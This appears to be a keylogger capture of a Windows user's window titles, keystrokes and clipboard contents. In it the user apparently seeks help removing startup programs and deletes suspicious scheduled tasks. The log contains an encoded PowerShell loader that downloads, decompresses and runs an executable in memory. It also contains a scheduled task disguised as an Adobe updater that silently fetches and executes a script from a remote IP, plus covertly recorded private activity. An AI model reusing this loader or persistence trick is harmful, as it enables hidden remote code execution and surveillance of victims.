+              D0AIAAnAEcARQBUACcAOwANAAoAIAAgACAAIAAkAHIAZQBxAHUAZQBzAHQALgBVAHMAZQByAEEAZwBlAG4AdAAgAD0AIAAkAHUAcwBlAHIAQQBnAGUAbgB0ADsADQAKAA0ACgAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlACAAPQAgACQAcgBlAHEAdQBlAHMAdAAu
+              AEcAZQB0AFIAZQBzAHAAbwBuAHMAZQAoACkAOwANAAoAIAAgACAAIAB0AHIAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAcgBlAHMAcABvAG4AcwBlAC4ARwBlAHQAUgBlAHMAcABvAG4AcwBlAFMAdAByAGUAYQBtACgAKQA
+              7AA0ACgAgACAAIAAgACAAIAAgACAAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAgACAAIAAgACAAIAAgACAAJABzAHQAcg
+              BlAGEAbQAuAEMAbwBwAHkAVABvACgAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAbQBlAG0AbwByAHkAUwB0AHIAZQBhAG0ALgBUAG8AQQByAHIAYQB5ACgAKQA7AA0ACgAgACAAIAAgAH0AD
+              QAKACAAIAAgACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHAAbwBuAHMAZQAuAEMAbABvAHMAZQAoACkAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgANAAoAZgB1AG4AYwB0AGkAbwBuACAARQB4AHAAYQBuAGQALQBHAHoA
+              aQBwAEIAeQB0AGUAcwAgAHsADQAKACAAIAAgACAAcABhAHIAYQBtACgADQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAIAA9ACAAJAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQ
+              AZQBbAF0AXQAgACQAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAHMADQAKACAAIAAgACAAKQANAAoADQAKACAAIAAgACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG
+              0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACAAJABjAG8AbQBwAHIAZQBzAHMAZQBkAEIAeQB0AGUAcwApADsADQAKACAAIAAgACAAJABvAHUAdABwAHUAdABTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNA
+              GUAbQBvAHIAeQBTAHQAcgBlAGEAbQA7AA0ACgAgACAAIAAgACQAZwB6AGkAcABTAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBt
+              ACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0ALAAgACgAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAOwANAAoAIAAgACAAIAAkAGcAegBpAHAAUwB
+              0AHIAZQBhAG0ALgBDAG8AcAB5AFQAbwAoACQAbwB1AHQAcAB1AHQAUwB0AHIAZQBhAG0AKQA7AA0ACgANAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0ALgBDAGwAbwBzAGUAKAApADsADQAKACAAIAAgACAAJABpAG4AcAB1AHQAUwB0AHIAZQBhAG0ALg
+              BDAGwAbwBzAGUAKAApADsADQAKAA0ACgAgACAAIAAgAHIAZQB0AHUAcgBuACAAJABvAHUAdABwAHUAdABTAHQAcgBlAGEAbQAuAFQAbwBBAHIAcgBhAHkAKAApADsADQAKAH0AOwANAAoADQAKAGYAdQBuAGMAdABpAG8AbgAgAEkAbgB2AG8AawBlAC0ATQBlAHQAa
+              ABvAGQARQBuAHQAcgB5ACAAewANAAoAIAAgACAAIABwAGEAcgBhAG0AKAANAAoAIAAgACAAIAAgACAAIAAgAFsAUABhAHIAYQBtAGUAdABlAHIAKABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAWwBTAHkA
+              cwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBNAGUAdABoAG8AZABJAG4AZgBvAF0AIAAkAE0AZQB0AGgAbwBkAA0ACgAgACAAIAAgACkADQAKAA0ACgAgACAAIAAgACQAcgBlAHMAdQBsAHQAIAA9ACAAaQBmACAAKAAkAE0AZQB0AGgAbwBkAC4ARwBlAHQ
+              AUABhAHIAYQBtAGUAdABlAHIAcwAoACkALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAE0AZQB0AGgAbwBkAC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsADQAKACAAIAAgACAAfQANAA
+              oAIAAgACAAIABlAGwAcwBlACAAewANAAoAIAAgACAAIAAgACAAIAAgACQATQBlAHQAaABvAGQALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAOwANAAoAIAAgACAAIAB9ADsADQAKAA0ACgAgA
+              CAAIAAgAGkAZgAgACgAJAByAGUAcwB1AGwAdAAgAC0AaQBzACAAWwBTAHkAcwB0AGUAbQAuAFQAaAByAGUAYQBkAGkAbgBnAC4AVABhAHMAawBzAC4AVABhAHMAawBdACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAEcAZQB0AEEAdwBh
+              AGkAdABlAHIAKAApAC4ARwBlAHQAUgBlAHMAdQBsAHQAKAApADsADQAKACAAIAAgACAAfQANAAoAfQA7AA0ACgANAAoAZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAHsADQAKACAAIAAgACAAcABhAHIAYQB
+              tACgADQAKACAAIAAgACAAIAAgACAAIABbAFAAYQByAGEAbQBlAHQAZQByACgATQBhAG4AZABhAHQAbwByAHkAIAA9ACAAJAB0AHIAdQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAFsAYgB5AHQAZQBbAF0AXQAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMADQ
+              AKACAAIAAgACAAKQANAAoADQAKACAAIAAgACAAaQBmACAAKAAkAFAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADQAMAA5ADYAIAAtAG8AcgAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMAWwAwAF0AIAAtAG4AZQAgADAAe
+              AA0AEQAIAAtAG8AcgAgACQAUABhAHkAbABvAGEAZABCAHkAdABlAHMAWwAxAF0AIAAtAG4AZQAgADAAeAA1AEEAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ASQBuAHYAYQBsAGkAZABEAGEAdABhAEUA
+              eABjAGUAcAB0AGkAbwBuAF0AOgA6AG4AZQB3ACgAJwBQAGEAeQBsAG8AYQBkACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAKABFAFgARQApACAAYQBmAHQAZQByACAAZABlAGMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuACcAKQA7AA0ACgAgACA
+              AIAAgAH0ADQAKAA0ACgAgACAAIAAgAHQAcgB5ACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBzAHMAZQBtAGIAbAB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAF
+              AAYQB5AGwAbwBhAGQAQgB5AHQAZQBzACkAOwANAAoAIAAgACAAIAB9AA0ACgAgACAAIAAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAbwBhAGQARQByAHIAbwByACAAPQAgAGkAZgAgACgAJABuAHUAbABsACAALQBuAGUAIAAkAF8ALgBFA
+              HgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBl
+              ADsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQA
+              7AA0ACgAgACAAIAAgACAAIAAgACAAdABoAHIAbwB3ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUATABvAGEAZABFAHgAYwBlAHAAdABpAG8AbgBdADoAOgBuAGUAdwAoACcASQBuAC0AbQBlAG0AbwByAHkAIABhAHMAcwBlAG0AYgBsAHkAIABsAG8AYQ
+              BkACAAZgBhAGkAbABlAGQAOgAgACcAIAArACAAJABsAG8AYQBkAEUAcgByAG8AcgApADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAaQBmACAAKAAkAGEAcwBzAGUAbQBiAGwAeQAuAEUAbgB0AHIAeQBQAG8AaQBuAHQAIAAtAGUAcQAgACQAbgB1AGwAb
+              AApACAAewANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuADsADQAKACAAIAAgACAAfQANAAoADQAKACAAIAAgACAASQBuAHYAbwBrAGUALQBNAGUAdABoAG8AZABFAG4AdAByAHkAIAAtAE0AZQB0AGgAbwBkACAAJABhAHMAcwBlAG0AYgBsAHkALgBFAG4A
+              dAByAHkAUABvAGkAbgB0ADsADQAKAH0ADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACAAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwAgAD0AIABHAGUAdAAtAEQAbwB3AG4AbABvAGEAZABCAHkAdABlAHMAIAAtAFU
+              AcgBpACAAJABmAGkAbABlAFUAcgBsADsADQAKAH0ADQAKAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAZQB4AGkAdAAgAD
+              EAOwANAAoAfQANAAoADQAKAGkAZgAgACgAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAMAAyA
+              DQAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAKAAnAEQAbwB3AG4AbABvAGEAZAAgAGYAYQBpAGwAZQBkADoAIABlAHgAcABlAGMAdABlAGQAIABiAGkAbgBhAHIAeQAgAHAAYQB5AGwAbwBhAGQAIABiAHUAdAAgAGcAbwB0ACAAewAw
+              AH0AIABiAHkAdABlAHMALgAnACAALQBmACAAQAAoACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAOwANAAoAIAAgACAAIABlAHgAaQB0ACAAMQA7AA0ACgB9AA0ACgANAAoAaQBmACAAKAAkAGQAbwB3AG4AbABvAGEAZAB
+              lAGQAQgB5AHQAZQBzAFsAMABdACAALQBlAHEAIAAwAHgAMwBDACkAIAB7AA0ACgAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACcARABvAHcAbgBsAG8AYQBkACAAZgBhAGkAbABlAGQAOgAgAHMAZQByAHYAZQByACAAcgBlAHQAdQByAG4AZQBkACAASA
+              BUAE0ATAAgAGkAbgBzAHQAZQBhAGQAIABvAGYAIABiAGkAbgBhAHIAeQAuACAAQwBoAGUAYwBrACAAVgBQAFMAIABVAFIATAAgAGEAbgBkACAAZgBpAGwAZQAgAHAAYQB0AGgALgAnADsADQAKACAAIAAgACAAZQB4AGkAdAAgADEAOwANAAoAfQANAAoADQAKACMAI
+              ABSAGUAcwB0AG8AcgBlACAARwBaAEkAUAAgAGgAZQBhAGQAZQByACAAYgB5AHQAZQBzACAAKABQAEgAUAAgAHMAZQByAHYAZQByACAAbQBhAHMAawBzACAAZgBpAHIAcwB0ACAAOAAgAGIAeQB0AGUAcwAsACAAZQAuAGcALgAgAHsAXAByAHQAZgAxAH0AKQA7AA0A
+              CgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsAMABdACAAPQAgADAAeAAxAEYAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADEAXQAgAD0AIAAwAHgAOABCADsADQAKACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHM
+              AWwAyAF0AIAA9ACAAMAB4ADAAOAA7AA0ACgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsAMwBdACAAPQAgADAAeAAwADAAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADQAXQAgAD0AIAAwAHgAMAAwADsADQAKACQAZABvAH
+              cAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMAWwA1AF0AIAA9ACAAMAB4ADAAMAA7AA0ACgAkAGQAbwB3AG4AbABvAGEAZABlAGQAQgB5AHQAZQBzAFsANgBdACAAPQAgADAAeAAwADAAOwANAAoAJABkAG8AdwBuAGwAbwBhAGQAZQBkAEIAeQB0AGUAcwBbADcAXQAgA
+              D0AIAAwAHgAMAAwADsADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACAAJABwAGEAeQBsAG8AYQBkAEIAeQB0AGUAcwAgAD0AIABFAHgAcABhAG4AZAAtAEcAegBpAHAAQgB5AHQAZQBzACAALQBjAG8AbQBwAHIAZQBzAHMAZQBk
+              AEIAeQB0AGUAcwAgACQAZABvAHcAbgBsAG8AYQBkAGUAZABCAHkAdABlAHMAOwANAAoAfQANAAoAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAoACcARwBaAEkAUAAgAGQAZQBjAG8AbQBwAHIAZQBzAHMAaQBvAG4AIAB
+              mAGEAaQBsAGUAZAA6ACAAJwAgACsAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQA7AA0ACgAgACAAIAAgAGUAeABpAHQAIAAxADsADQAKAH0ADQAKAA0ACgB0AHIAeQAgAHsADQAKACAAIAAgACAASQBuAHYAbwBrAGUALQBQAGEAeQ
+              BsAG8AYQBkAEIAeQB0AGUAcwAgAC0AUABhAHkAbABvAGEAZABCAHkAdABlAHMAIAAkAHAAYQB5AGwAbwBhAGQAQgB5AHQAZQBzADsADQAKAH0ADQAKAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAJABlAHIAcgBvAHIATQBlAHMAcwBhAGcAZQAgAD0AIABpAGYAI
+              AAoACQAbgB1AGwAbAAgAC0AbgBlACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAA
+              dABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoAIAAgACAAIAB9AA0ACgAgACAAIAAgAGUAbABzAGUAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAfQANAAoADQAKACA
+              AIAAgACAAVwByAGkAdABlAC0ARQByAHIAbwByACAAJABlAHIAcgBvAHIATQBlAHMAcwBhAGcAZQA7AA0ACgAgACAAIAAgAGUAeABpAHQAIAAxADsADQAKAH0A
+  
+  
+  
+  AdobeDailyUpdateCheck_{B9150512-0186-46C3-BAEC-A80AA35AC5D0}
+  
+  
+  Execute   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Arguments : -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAdABvAHAAJwANAAoASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkA
+              bwBuACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwADoALwAvADMAOAAuADEAOAAwAC4AMgAwADQALgAyADAAMAAvAHYAcABzAC4AdAB4AHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGc
+              AKQAuAEMAbwBuAHQAZQBuAHQA
+
+--- WINDOW  2026.07.27 11:17:08  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:10  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl][Ctrl][Ctrl][Ctrl]<[ENTER]
+  [LMB]
+  [Clipboard]
+  Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+  Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B9150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+
+--- WINDOW  2026.07.27 11:17:49  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:50  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:51  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:51  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:52  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:17:52  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:08  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:11  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:11  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:18:44  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:46  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:46  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:59  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:18:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:00  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:00  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:01  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:01  [Discord.exe] @Yuriy - Discord
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:02  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:02  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:02  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:03  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Clipboard]
+  Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-List
+
+--- WINDOW  2026.07.27 11:19:08  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:08  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:14  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Clipboard]
+  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
+
+--- WINDOW  2026.07.27 11:19:17  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:17  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:24  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  =5 2A0[Bk]B0=>2;N202[ENTER]
+
+--- WINDOW  2026.07.27 11:19:57  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:57  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:19:59  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+  [Clipboard]
+  PS C:\Windows\system32> Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+  >> Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B9150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+  PS C:\Windows\system32> Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+  >> Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B9150512-0186-46C3-BAEC-A80AA35AC5D0}" -Confirm:$false
+  Unregister-ScheduledTask : No MSFT_ScheduledTask objects found with property 'TaskName' equal to 'AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0}'.  Verify the value of the property and retry.
+  At line:1 char:1
+  + Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B8150512-0 ...
+  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      + CategoryInfo          : ObjectNotFound: (AdobeDailyUpdat...C-A80AA35AC5D0}:String) [Unregister-ScheduledTask], CimJobException
+      + FullyQualifiedErrorId : CmdletizationQuery_NotFound_TaskName,Unregister-ScheduledTask
+  
+  Unregister-ScheduledTask : No MSFT_ScheduledTask objects found with property 'TaskName' equal to 'AdobeDailyUpdateCheck_{B9150512-0186-46C3-BAEC-A80AA35AC5D0}'.  Verify the value of the property and retry.
+  At line:2 char:1
+  + Unregister-ScheduledTask -TaskName "AdobeDailyUpdateCheck_{B9150512-0 ...
+  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+      + CategoryInfo          : ObjectNotFound: (AdobeDailyUpdat...C-A80AA35AC5D0}:String) [Unregister-ScheduledTask], CimJobException
+      + FullyQualifiedErrorId : CmdletizationQuery_NotFound_TaskName,Unregister-ScheduledTask
+  
+  PS C:\Windows\system32> Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-List
+  
+  
+  Name     : OneDriveSetup
+  Command  : C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup
+  Location : HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : OneDriveSetup
+  Command  : C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup
+  Location : HKU\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Figma Agent
+  Command  : "C:\Users\Artem\AppData\Local\FigmaAgent\figma_agent.exe"
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Steam
+  Command  : "C:\Program Files (x86)\Steam\steam.exe" -silent
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : DAEMON Tools Lite Automount
+  Command  : "C:\Program Files\DAEMON Tools Lite\DTAgent.exe" -autorun
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Microsoft Edge Update
+  Command  : "C:\Users\Artem\AppData\Local\Microsoft\EdgeUpdate\1.3.251.5\MicrosoftEdgeUpdateCore.exe"
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Battle.net
+  Command  : "C:\Program Files (x86)\Battle.net\Battle.net.exe" --autostarted
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Discord
+  Command  : "C:\Users\Artem\AppData\Local\Discord\Update.exe" --processStart Discord.exe --process-start-args "--start-inactive"
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : MicrosoftEdgeAutoLaunch_F16277FEC685AAB7CFECB93682CDF21A
+  Command  : "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : Viber
+  Command  : "C:\Users\Artem\AppData\Local\Viber\Viber.exe" AutoStart
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : EPLTarget\P0000000000000000
+  Command  : C:\Windows\system32\spool\DRIVERS\x64\3\E_YATISQE.EXE /EPT "EPLTarget\P0000000000000000" /M "L6160 Series"
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : com.squirrel.slack.slack
+  Command  : "C:\Users\Artem\AppData\Local\slack\slack.exe" --process-start-args --startup
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : GoogleChromeAutoLaunch_DA475B33197C3B1BB4308C1E890946E6
+  Command  : "C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window /prefetch:5
+  Location : HKU\S-1-5-21-2638959922-1800911258-2240121548-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+  Name     : AnyDesk
+  Command  : C:\PROGRA~2\AnyDesk\AnyDesk.exe  --control
+  Location : Common Startup
+  
+  Name     : WinZip Preloader
+  Command  : C:\PROGRA~1\WinZip\WZPREL~1.EXE
+  Location : Common Startup
+  
+  Name     : SecurityHealth
